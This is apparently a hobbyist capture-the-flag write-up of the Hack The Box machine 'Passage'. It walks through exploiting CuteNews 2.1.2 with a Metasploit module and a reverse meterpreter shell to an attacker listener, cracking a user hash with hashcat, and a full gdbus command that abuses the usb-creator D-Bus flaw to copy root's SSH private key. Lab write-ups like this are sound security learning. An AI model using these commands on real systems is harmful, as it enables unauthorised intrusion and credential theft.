# Passage

![Logo](https://www.hackthebox.eu/storage/avatars/ec88bbe570fd512ab370208e5139bb41.png)

Passage is a box at 10.10.10.206 and rated 4.3 oriented on real life situations.  
This box is at a 50% hard so it's gonna be a lotta fun

## First inspection

As always let's do a nmap to grab some informations!  
So what we got: ssh, http(apache), and a linux kernel!  
Let's go to the website so!  

## Cutie Cute Website

So first information we have a website basically with articles, comments and a RSS Flux
We can send email to the writers of the articles, write comments and apparently smiley .. (ntg amazing)  
One article stand out from the others which is FAIL2BAN, a pretty well known technique that consist of banning in case of too many requests from on IP.  
So we'll go easy with the approach!  
At the bottom of the page there is the mention of "CuteNews" and boom CutePHP and exploitDB returns me an exploit for the 2.1.2 version so let's quickly search the actual version on this website.  
After a quick look on their GH repo, we can access login via *link/CuteNews* so let's go and BOOOOOM we have the mention below saying **Powered by CuteNews 2.1.2 © 2002–2020 CutePHP.**  

The Exploit we're gonna use is the number **46698** but there are others, feel free to use them.  

## First Exploit of the day

After setting up our metasploit and added our module (46698), we can start set up our settings like so:

```sh
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   pwn              no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.206     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /CuteNews        yes       Base CutePHP directory path
   USERNAME   pwn              yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.106     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

And now we have a meterpreter, it was pretty easy doh !  
Let's get our first flag then, the user flag!  

## Privilege Escalation

By going under */home/* we see two users, **nadav and paul** but of course we don't have access to anything  
Let's get back to our */var/www/html/CuteNews/* folder and let's try to see if there are users creds !  
And under this folder we do have a */cdata/users* with a loooot of files and 2 different:

- users.txt which is empty.  
- lines which contains stg that look like hashed sentence with base64.  

After some base64decode on them we have some json !  
As i don't want to list all of them to find one of my user, imma go for the largest one (if you've a website i'm pretty sure that your own profile is complete !).  

So the most complete profil are: paul-coles (we got him!), kim-swift, sid-meyer, admin, egree5
As we want the user token first let's start with paul! (but keep admin not to far)  
In the information there is one called *64* and i guess this is a hashed password!  let's break it with hashcat and rockyou.txt  
`hashcat -m 1400/17400 paul.hash /usr/share/wordlists/rockyou.txt --show --force` and the password is "atlanta1" so my guess for SHA512 was right.  
BEFORE ANYBODY WANTS TO INSULT ME BC OF THIS SHORTCUT:

- I do suck at finding which encryption method is used and most of the time rely on the big one (sha512-md5-shaX) and judge by the look of it
- If you're experienced with finding hash type (or have tool) --> CONTACT ME  
- Yes I'm actually working on this

## Get Paul & Nadav account

So I did struggle with this one but not for a normal reason lol,  
I had som trouble with metasploit who just fucked me with the meterpreter shell, so I simply changed the payload to a simple reverse tcp shell!  
First let's get this **user** key  
Basically once in, I did a ps and saw a lot of sshd process (I noticied them bc I'm working on them at the uni lol)
And in the default ssh authorized_keys file, i saw the other user that I noticied earlier so let's just ssh directly to it, praying there is no passphrase (ALWAYS USE A PASSPHRASE GODDAMNIT)  

## Jump from Nadav to root  

Alright now start the real shit, i'm not gonna lie, a friend oriented me on where to search as I were stuck on this one for quite a long and I've learned a loooot by solving this one!  
My friend told me to have a look at the usb sooo at first I looked at the connected media but nothing worthy, and lost in my tentative I've looked desperetly to `ps aux` once again.  
AND the truth appeared, it was called *2421*, basically a process called /usb-creator  
In less than three seconds, I found stg by typing *"usbcreator exploit"* and BOUM there is a vulnerability with the DBUS, so I'm not really good at DBUS (and haven't really worked with before except for a tiny project) so it took me kinda long to write the right command!  

Basically this usbcreator doesn't care of who's calling the process and just execute the copy, so why can't I copy the root ssh key to a file with that ?? Yeah that's exactly what I did....  

### What is a DBUS

Let's first clarify things before going any further, DBUS means Desktop Bus, which is an Inter-Process Communication, and a Remote Procedure Call (THX WIKIPEDIA FOR THIS).  
But concretly how is it useful ?  As I said upper, that's a communcation between process on a same machine, so I can of course call a function to an already existing process, in this case this is my usbcreator  
This way I can tell what to do to my already existing process!!
Let's do it then.  

Herethis is a GNOME process and so we're gonna interact with the GDBUS (Gnome ModBus). Let's write our command

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/just_got_pwned true
```

I based myself on [this](https://www.exploit-db.com/exploits/36820) to recreate a call that match my needs. A really long but passionating article can be found [here](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) and basically explain you completly how to do it !!  

And then the end is really soon, just use your file at /tmp/just_got_pwned as your identification key to root@10.10.10.206 to access a root account and BOOM, root.txt is waiting for you!!  

## Conclusion

This box was a lotta fun to do!! I really recommend it to everybody as it isn't a really horrible one, pretty logic and understandable but with still a good challenge behind !!  
I spend a long time understanding DBus but it was worthy and honestly learned a lot, maybe gonna deep down later bc there is a lot to see and to do with !!  
